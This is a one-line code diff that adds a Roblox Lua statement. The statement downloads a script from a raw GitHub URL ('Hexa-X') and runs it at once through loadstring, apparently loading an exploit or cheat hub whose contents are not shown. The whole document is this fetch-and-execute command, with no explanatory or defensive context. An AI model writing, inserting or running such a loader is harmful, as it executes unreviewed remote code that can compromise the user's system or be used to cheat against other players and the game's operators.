@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NonyH/Hexa-X/refs/heads/main/HexaX"))()
